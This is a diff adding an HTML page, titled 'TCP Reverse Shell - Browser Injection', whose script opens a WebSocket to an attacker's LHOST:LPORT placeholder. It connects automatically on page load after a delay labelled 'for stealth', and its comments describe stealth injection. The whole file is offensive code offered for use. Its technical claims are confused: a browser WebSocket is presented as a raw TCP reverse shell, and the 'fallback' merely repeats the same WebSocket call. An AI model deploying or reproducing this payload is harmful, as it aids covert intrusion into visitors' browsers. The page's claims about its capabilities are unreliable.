@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser Shell</title>
+    <style>
+        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
+        #output { height: 400px; overflow-y: auto; border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; white-space: pre-wrap; }
+        input { width: 70%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+        button { background: #0f0; color: #000; border: none; padding: 5px 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>TCP Reverse Shell - Browser Injection</h2>
+    <div id="output"></div>
+    <input type="text" id="cmd" placeholder="Enter command..." autocomplete="off">
+    <button onclick="sendCmd()">Execute</button>
+    <button onclick="connectShell()">Connect Shell</button>
+
+    <script>
+        let shellConnected = false;
+        let ws = null;
+        const output = document.getElementById('output');
+        const cmdInput = document.getElementById('cmd');
+
+        function log(msg) {
+            output.textContent += new Date().toLocaleTimeString() + ' > ' + msg + '\n';
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function connectShell() {
+            // Replace with your LHOST:LPORT (attacker's IP:port)
+            const LHOST = 'YOUR_IP_HERE';  // e.g., '192.168.1.100'
+            const LPORT = 4444;            // Your listening port
+            
+            log('Attempting reverse TCP connection to ' + LHOST + ':' + LPORT);
+            
+            // WebSocket reverse shell (works through most firewalls)
+            try {
+                ws = new WebSocket('ws://' + LHOST + ':' + LPORT);
+                
+                ws.onopen = function() {
+                    shellConnected = true;
+                    log('✅ SHELL CONNECTED - WebSocket TCP tunnel established');
+                };
+                
+                ws.onmessage = function(event) {
+                    log('OUTPUT: ' + event.data);
+                };
+                
+                ws.onclose = function() {
+                    shellConnected = false;
+                    log('❌ Shell connection closed');
+                };
+                
+                ws.onerror = function(error) {
+                    log('❌ WebSocket error: ' + error);
+                };
+            } catch(e) {
+                log('❌ WebSocket failed: ' + e);
+                fallbackShell(LHOST, LPORT);
+            }
+        }
+
+        function fallbackShell(host, port) {
+            // Fallback: Raw TCP socket attempt (Chrome/Edge only)
+            log('Trying raw TCP socket fallback...');
+            
+            const socket = new WebSocket('ws://' + host + ':' + port);
+            socket.onopen = () => log('✅ Raw TCP fallback connected');
+        }
+
+        function sendCmd() {
+            if (!shellConnected || !ws) {
+                log('❌ Shell not connected. Click "Connect Shell" first.');
+                return;
+            }
+            
+            const cmd = cmdInput.value.trim();
+            if (!cmd) return;
+            
+            log('$ ' + cmd);
+            ws.send(cmd);
+            cmdInput.value = '';
+        }
+
+        // Auto-connect on load (stealth injection)
+        window.onload = function() {
+            log('Browser shell payload loaded');
+            setTimeout(connectShell, 2000); // Delay for stealth
+        };
+
+        // Enter key support
+        cmdInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendCmd();
+        });
+
+        // Stealth: Hide from casual inspection
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                log('[HIDDEN] Page backgrounded');
+            }
+        });
+    </script>
+</body>
+</html>
